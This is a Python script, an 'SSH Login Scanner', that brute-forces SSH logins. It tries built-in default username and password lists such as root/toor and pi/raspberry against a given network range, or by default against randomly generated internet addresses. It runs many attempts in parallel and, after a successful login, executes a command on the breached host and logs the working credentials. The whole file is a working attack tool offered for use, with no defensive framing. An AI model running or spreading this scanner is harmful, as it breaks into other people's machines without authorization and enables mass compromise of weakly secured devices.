#!/usr/bin/env python3

""" SSH Login Scanner v4     """        


import paramiko
import time
import datetime
import socket
import random
import threading
import ipaddress
import signal
import prettyprint as pp
from optparse import OptionParser
import concurrent.futures

def signal_handler(signal, frame):
		pp.error('System Interupt requested, attempting to exit cleanly!')
		exit(1)

signal.signal(signal.SIGINT, signal_handler)


def SSHBruteForce(host, userlist, passwordlist):
    """ brute force SSH login using a dictionary list"""

    err = []
    out = []
    verb = []
    warn = []

    verb.append("Performing SSH login bruteforce on %s"%host)

    if not userlist:
        userlist=["root", "pi", "admin", "user", "test", "ubuntu"]
    if not passwordlist:
        passwordlist=["toor", "admin", "administrator", "webadmin", "maintenance", "alpine", "Passw@rd", "logon", "techsupport", 
        "webmaster", "password", "123456", "12345678", "123456789", "1234567890", "qazwsx","root","changeme","raspberry",
        "dietpi", "letmein", "test", "guest", "uploader", "ubuntu"]

    

    #check that port 22 on host is open
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((host, 22))
        banner = s.recv(1024).strip().decode('utf-8').lower()
        s.close()
        if "ssh" not in banner:
            err.append("Bad response from %s, aborting!"%host)
            return err, out, verb, warn
    except Exception as e:
        err.append("SSH is not available on %s (%s)"%(host,e))
        return (err, out, verb, warn)


    ssh=paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())


    for user in userlist:
        for password in passwordlist:
            try:
                ssh.connect(host, username=user, password=password,banner_timeout=20)
                stdin, stdout, stderr = ssh.exec_command("uname -onmr")
                out.append("SSH login successful on %s (%s:%s) [%s]"%(host, user, password, stdout.read().strip().decode('utf-8')))
                ssh.close()
                return (err,out,verb,warn)

            except Exception as e:
                warn.append("SSH login failed on %s (%s:%s) [%s]"%(host, user, password, e))
                ssh.close()
    return (err,out,verb,warn)



def randomHost():
    """ Generates a random IP address """
    host=str(random.randint(1,254))
    host+="."+str(random.randint(0,255))
    host+="."+str(random.randint(0,255))
    host+="."+str(random.randint(0,254))
    return host


def main():
    ctime=datetime.datetime.now() # returns "yy-mm-dd hh:mm:ss.xx"
 
    parser=OptionParser(version="%prog 4.0") # Parser for command line arguments
    parser.add_option("-n", dest="nhost", type="int",\
                      help="Number of hosts", metavar="nHost")
    parser.add_option("-o", "--output", dest="oFile", type="string",\
                      help="File to save logs", metavar="FILE")
    parser.add_option("-v", "--verbose", dest="verbose", default=False,\
                      action="store_true",\
                      help="Logs everything")
    parser.add_option("-t", "--timeout", dest="timeout", type="float",\
                      help="Timeout in seconds")
    parser.add_option("-m", "--maxthread", dest="max", type="int",\
                      help="Maximum thread number")
    parser.add_option("-r", "--remote", dest="target", type="string",\
                        help="Targeted host to scan")
    parser.add_option("-U", "--userlist", dest="userlist", type="string",\
                        help="List of users to check")
    parser.add_option("-P", "--passlist", dest="passlist", type="string",\
                        help="List of passwords to check")

    (options, args)= parser.parse_args()
    """ parse options"""
    if options.nhost:
        nhost=options.nhost
    else:   
        nhost=10
    if options.oFile: 
        global logfile
        logfile=options.oFile
        pp.log_status("\nScan started at: %s\n"%ctime, logfile)
   
    else:
        logfile=None
    if options.verbose:
        verbose=True
    else:
        verbose=False
    if options.timeout:
        timeout=options.timeout
    else:
        timeout=5
    if options.max:
        tmax=options.max
    else:
        tmax=10

    if options.userlist:
        userlist=[line.rstrip() for line in open(options.userlist)]
    else:
        userlist=None

    if options.passlist:
        passwordlist=[line.rstrip() for line in open(options.passlist)]
    else:
        passwordlist=None

    try:
        ip_list=[]
        if options.target:
            target=options.target
            
            ip_list=list(ipaddress.ip_network(target, False).hosts())
            nhost=len(ip_list)
        else:
            for _ in range(nhost):
                ip_list.append(ipaddress.ip_address(randomHost()))
    
    except Exception as e:
        pp.error("Bad IP address (%s)"%target)
        if logfile:
            pp.log_error("Bad IP address (%s)"%target, logfile)
        exit(1)



    nthreads=threading.activeCount() # get initial number of running threads
    socket.setdefaulttimeout(timeout) # set timeout

    pp.status("Starting scan...")
    if logfile:
        pp.log_status("Starting scan...", logfile)

    
    with concurrent.futures.ThreadPoolExecutor(max_workers=tmax) as executor:
        results = [executor.submit(SSHBruteForce, str(ip), userlist, passwordlist) for ip in ip_list]
        
        for f in concurrent.futures.as_completed(results):
            err,out,verb,warn = f.result()
            
            for v in verb:
                if verbose:
                    pp.info(v)
                if logfile:
                    pp.log_info(v, logfile)

            for o in out:
                pp.status(o)
                if logfile:
                    pp.log_status(o, logfile)
            

            for e in err:
                if verbose:
                    pp.error(e)
                if logfile:
                    pp.log_error(e, logfile)
                
            for w in warn:
                if verbose:
                    pp.warning(w)
                if logfile:
                    pp.log_warning(w, logfile)



    etime=datetime.datetime.now() # returns "yy-mm-dd hh:mm:ss.xx
    total =  etime - ctime

    tcount=0
    while threading.activeCount()>nthreads:
        if tcount == 0:
            pp.info("Waiting for threads to finish...")
            tcount=1
        else:
            pp.info_spaces("Still %s/%d threads running..."%((threading.activeCount()-1),tmax))
            time.sleep(1)                      # wait for all threads to finish

    pp.status("Scan completed in: %s"%str(total)[:str(total).index(".")])
    if logfile:
        pp.log_status("Scan completed in: %s"%str(total)[:str(total).index(".")], logfile)





if __name__=="__main__":
    main()

   
   

